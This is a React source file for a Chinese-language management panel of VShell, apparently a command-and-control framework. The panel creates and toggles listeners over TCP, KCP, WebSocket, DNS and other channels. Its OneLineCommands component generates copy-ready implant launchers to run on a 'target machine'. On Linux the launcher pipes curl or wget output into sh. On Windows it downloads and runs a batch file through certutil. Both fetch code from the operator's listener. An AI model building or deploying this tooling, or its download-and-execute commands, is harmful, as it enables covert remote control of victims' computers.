"use client";

// VShell 监听管理(仿原版):新增/编辑/启停/删除 + 上线命令查看。
// 走通用转发端点,字段名与 vshell 端点逐字对齐(Mode/ListenAddr/...)。
import * as React from "react";
import { PencilIcon, PlusIcon, PowerIcon, PowerOffIcon, RefreshCwIcon, TerminalSquareIcon, Trash2Icon } from "lucide-react";
import { toast } from "sonner";

import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Field, FieldGroup, FieldLabel } from "@/components/ui/field";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { api } from "@/lib/api";
import type { VshellServer } from "@/lib/types";

export interface VshellListener {
  Id: number;
  Remark: string;
  Mode: string;
  ListenAddr: string;
  ConnectAddr: string;
  WsConnectAddr?: string;
  DNSDomain?: string;
  PublicDNS?: string;
  DisconnectTimeout: number;
  PingInterval: number;
  Vkey: string;
  EncryptSalt: string;
  OssUrl?: string;
  Status: boolean;
}

const MODES = [
  { value: "tcp", label: "TCP" },
  { value: "kcp", label: "KCP/UDP" },
  { value: "ws", label: "WebSocket" },
  { value: "dns", label: "DNS" },
  { value: "doh", label: "DOH" },
  { value: "dot", label: "DOT" },
  { value: "oss", label: "OSS" },
];

async function callApi(serverId: string, endpoint: string, body?: unknown) {
  const r = await fetch(`/api/shell/vshell/${serverId}/api/${endpoint}`, {
    method: "POST",
    headers: { "Content-Type": "application/json", Authorization: `Bearer ${localStorage.getItem("artex_token") ?? ""}` },
    body: JSON.stringify({ endpoint, body: body ?? {} }),
  });
  const payload = (await r.json().catch(() => ({}))) as { error?: string; result?: unknown };
  if (!r.ok) throw new Error(payload.error || `HTTP ${r.status}`);
  return payload.result;
}

export function VshellListenersPage({ server }: { server: VshellServer }) {
  const [items, setItems] = React.useState<VshellListener[]>([]);
  const [loading, setLoading] = React.useState(false);
  const [editing, setEditing] = React.useState<VshellListener | "new" | null>(null);
  const [cmdFor, setCmdFor] = React.useState<VshellListener | null>(null);
  const [busyId, setBusyId] = React.useState<number | null>(null);

  const load = React.useCallback(async () => {
    setLoading(true);
    try {
      const res = (await callApi(server.id, "listener/list", { page: 1, pageSize: 9999 })) as { items?: VshellListener[] } | null;
      setItems(res?.items ?? []);
    } catch (e) {
      toast.error(e instanceof Error ? e.message : "监听清单加载失败");
    } finally {
      setLoading(false);
    }
  }, [server.id]);

  React.useEffect(() => {
    void load();
  }, [load]);

  const act = async (listener: VshellListener, op: "start" | "stop" | "del") => {
    setBusyId(listener.Id);
    try {
      await callApi(server.id, `listener/${op}`, { id: listener.Id });
      toast.success(op === "del" ? "已删除" : op === "start" ? "已启用" : "已停用");
      await load();
    } catch (e) {
      toast.error(e instanceof Error ? e.message : "操作失败");
    } finally {
      setBusyId(null);
    }
  };

  return (
    <Card>
      <CardContent className="flex flex-col gap-4 px-0 pt-6">
        <div className="flex items-center gap-2 px-4 lg:px-6">
          <Button size="sm" onClick={() => setEditing("new")}>
            <PlusIcon className="size-4" /> 新增监听
          </Button>
          <Button size="sm" variant="outline" onClick={() => void load()} disabled={loading}>
            <RefreshCwIcon className={`size-4 ${loading ? "animate-spin" : ""}`} /> 刷新
          </Button>
          <span className="text-muted-foreground ml-auto mr-4 text-xs lg:mr-6">{items.length} 个监听</span>
        </div>
        <div className="overflow-x-auto px-4 lg:px-6">
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead className="w-14">ID</TableHead>
                <TableHead className="w-36">备注</TableHead>
                <TableHead className="w-20">模式</TableHead>
                <TableHead>监听地址</TableHead>
                <TableHead>外网连接地址</TableHead>
                <TableHead className="w-28">超时心跳(次)</TableHead>
                <TableHead className="w-24">心跳间隔(秒)</TableHead>
                <TableHead className="w-20">状态</TableHead>
                <TableHead className="w-40">操作</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {items.length === 0 && (
                <TableRow>
                  <TableCell colSpan={9} className="text-muted-foreground py-10 text-center">
                    {loading ? "加载中…" : "暂无监听——点「新增监听」创建"}
                  </TableCell>
                </TableRow>
              )}
              {items.map((l) => (
                <TableRow key={l.Id}>
                  <TableCell className="font-mono text-sm">#{l.Id}</TableCell>
                  <TableCell className="text-sm font-medium">{l.Remark || "—"}</TableCell>
                  <TableCell className="font-mono text-sm uppercase">{l.Mode}</TableCell>
                  <TableCell className="font-mono text-sm">{l.ListenAddr || "—"}</TableCell>
                  <TableCell className="max-w-56 truncate font-mono text-sm" title={l.ConnectAddr}>
                    {l.ConnectAddr || "—"}
                  </TableCell>
                  <TableCell className="font-mono text-sm">{l.DisconnectTimeout}</TableCell>
                  <TableCell className="font-mono text-sm">{l.PingInterval}</TableCell>
                  <TableCell>{l.Status ? <Badge className="bg-emerald-600">在线</Badge> : <Badge variant="secondary">离线</Badge>}</TableCell>
                  <TableCell>
                    <div className="flex items-center gap-0.5">
                      {l.Status ? (
                        <Button size="icon" variant="ghost" className="size-8" title="停用" disabled={busyId === l.Id} onClick={() => void act(l, "stop")}>
                          <PowerOffIcon className="size-4" />
                        </Button>
                      ) : (
                        <Button size="icon" variant="ghost" className="size-8" title="启用" disabled={busyId === l.Id} onClick={() => void act(l, "start")}>
                          <PowerIcon className="size-4" />
                        </Button>
                      )}
                      <Button size="icon" variant="ghost" className="size-8" title="编辑" onClick={() => setEditing(l)}>
                        <PencilIcon className="size-4" />
                      </Button>
                      {(l.Mode === "tcp" || l.Mode === "kcp") && (
                        <Button size="icon" variant="ghost" className="size-8" title="一键上线命令" onClick={() => setCmdFor(l)}>
                          <TerminalSquareIcon className="size-4" />
                        </Button>
                      )}
                      <Button
                        size="icon"
                        variant="ghost"
                        className="text-destructive size-8"
                        title="删除"
                        disabled={busyId === l.Id}
                        onClick={() => confirm(`删除监听 #${l.Id} ${l.Remark}?`) && void act(l, "del")}
                      >
                        <Trash2Icon className="size-4" />
                      </Button>
                    </div>
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </div>
      </CardContent>

      {editing && (
        <ListenerDialog
          server={server}
          listener={editing === "new" ? null : editing}
          onClose={() => setEditing(null)}
          onSaved={async () => {
            setEditing(null);
            await load();
          }}
        />
      )}

      <Dialog open={cmdFor !== null} onOpenChange={(o) => !o && setCmdFor(null)}>
        <DialogContent className="sm:max-w-xl">
          <DialogHeader>
            <DialogTitle>一键上线命令</DialogTitle>
            <DialogDescription>
              监听 #{cmdFor?.Id} {cmdFor?.Remark}({cmdFor?.Mode})——目标机执行即可上线。
            </DialogDescription>
          </DialogHeader>
          {cmdFor && <OneLineCommands listener={cmdFor} />}
        </DialogContent>
      </Dialog>
    </Card>
  );
}

function OneLineCommands({ listener }: { listener: VshellListener }) {
  const addr = listener.ListenAddr.replace(/^0\.0\.0\.0:/, hostAddr(listener));
  function hostAddr(l: VshellListener) {
    // ConnectAddr 形如 1.2.3.4:58084 或 ws://...;取主机部分拼监听端口
    const m = /\/\/?([\w.:-]+):(\d+)/.exec(l.ConnectAddr || "");
    if (m) return `${m[1]}:${m[2]}`;
    const lm = /:(\d+)$/.exec(l.ListenAddr || "");
    return lm ? `:${lm[1]}` : "";
  }
  const linux = `(curl -fsSL -m180 http://${addr}/slt||wget -T180 -q http://${addr}/slt)|sh`;
  const win = `certutil.exe -urlcache -split -f http://${addr}/swt C:\\Users\\Public\\run.bat && C:\\Users\\Public\\run.bat`;
  return (
    <div className="flex flex-col gap-3">
      {[
        { label: "Linux 上线命令", cmd: linux },
        { label: "Windows 上线命令", cmd: win },
      ].map((b) => (
        <div key={b.label}>
          <p className="mb-1 text-xs font-medium">{b.label}</p>
          <div className="flex items-start gap-2">
            <pre className="flex-1 overflow-auto rounded bg-black p-2 font-mono text-[11px] break-all text-zinc-200">{b.cmd}</pre>
            <Button size="sm" variant="outline" onClick={() => void navigator.clipboard.writeText(b.cmd).then(() => toast.success("已复制"))}>
              复制
            </Button>
          </div>
        </div>
      ))}
    </div>
  );
}

function ListenerDialog({
  server,
  listener,
  onClose,
  onSaved,
}: {
  server: VshellServer;
  listener: VshellListener | null;
  onClose: () => void;
  onSaved: () => void | Promise<void>;
}) {
  const [form, setForm] = React.useState({
    Mode: listener?.Mode ?? "tcp",
    Remark: listener?.Remark ?? "",
    ListenAddr: listener?.ListenAddr ?? "0.0.0.0:58084",
    ConnectAddr: listener?.ConnectAddr ?? "",
    DisconnectTimeout: listener?.DisconnectTimeout ?? 30,
    PingInterval: listener?.PingInterval ?? 10,
    Vkey: listener?.Vkey ?? "qwe123qwe",
    EncryptSalt: listener?.EncryptSalt ?? "qwe123qwe",
  });
  const [busy, setBusy] = React.useState(false);
  const set = (patch: Partial<typeof form>) => setForm((f) => ({ ...f, ...patch }));

  const save = async () => {
    if (!form.ListenAddr.trim()) {
      toast.error("监听地址不能为空");
      return;
    }
    setBusy(true);
    try {
      if (listener) await callApi(server.id, "listener/edit", { Id: listener.Id, ...form });
      else await callApi(server.id, "listener/add", form);
      toast.success(listener ? "监听已更新" : "监听已创建");
      await onSaved();
    } catch (e) {
      toast.error(e instanceof Error ? e.message : "保存失败");
    } finally {
      setBusy(false);
    }
  };

  return (
    <Dialog open onOpenChange={(o) => !o && onClose()}>
      <DialogContent className="max-h-[90vh] overflow-auto sm:max-w-lg">
        <DialogHeader>
          <DialogTitle>{listener ? `编辑监听 #${listener.Id}` : "新增监听"}</DialogTitle>
          <DialogDescription>模式 tcp/kcp/ws/dns/doh/dot/oss;tcp|ws 需外网连接地址,DNS 需域名。默认 30 次超时心跳、10 秒间隔。</DialogDescription>
        </DialogHeader>
        <FieldGroup>
          <div className="grid grid-cols-2 gap-3">
            <Field>
              <FieldLabel>模式</FieldLabel>
              <Select value={form.Mode} onValueChange={(v) => set({ Mode: v })}>
                <SelectTrigger>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {MODES.map((m) => (
                    <SelectItem key={m.value} value={m.value}>
                      {m.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </Field>
            <Field>
              <FieldLabel>备注</FieldLabel>
              <Input value={form.Remark} placeholder="如 TCP-1" onChange={(e) => set({ Remark: e.target.value })} />
            </Field>
          </div>
          <Field>
            <FieldLabel>监听地址 *</FieldLabel>
            <Input value={form.ListenAddr} className="font-mono text-xs" placeholder="0.0.0.0:8084" onChange={(e) => set({ ListenAddr: e.target.value })} />
          </Field>
          <Field>
            <FieldLabel>外网连接地址(tcp/ws)</FieldLabel>
            <Input value={form.ConnectAddr} className="font-mono text-xs" placeholder="127.0.0.1:8084" onChange={(e) => set({ ConnectAddr: e.target.value })} />
          </Field>
          <div className="grid grid-cols-2 gap-3">
            <Field>
              <FieldLabel>超时心跳次数</FieldLabel>
              <Input type="number" value={form.DisconnectTimeout} onChange={(e) => set({ DisconnectTimeout: Number(e.target.value) || 30 })} />
            </Field>
            <Field>
              <FieldLabel>心跳间隔(秒)</FieldLabel>
              <Input type="number" value={form.PingInterval} onChange={(e) => set({ PingInterval: Number(e.target.value) || 10 })} />
            </Field>
          </div>
          <div className="grid grid-cols-2 gap-3">
            <Field>
              <FieldLabel>Vkey</FieldLabel>
              <Input value={form.Vkey} onChange={(e) => set({ Vkey: e.target.value })} />
            </Field>
            <Field>
              <FieldLabel>流量加密盐</FieldLabel>
              <Input value={form.EncryptSalt} onChange={(e) => set({ EncryptSalt: e.target.value })} />
            </Field>
          </div>
        </FieldGroup>
        <DialogFooter>
          <Button variant="outline" onClick={onClose}>
            取消
          </Button>
          <Button disabled={busy} onClick={() => void save()}>
            {busy ? "保存中…" : "保存"}
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}
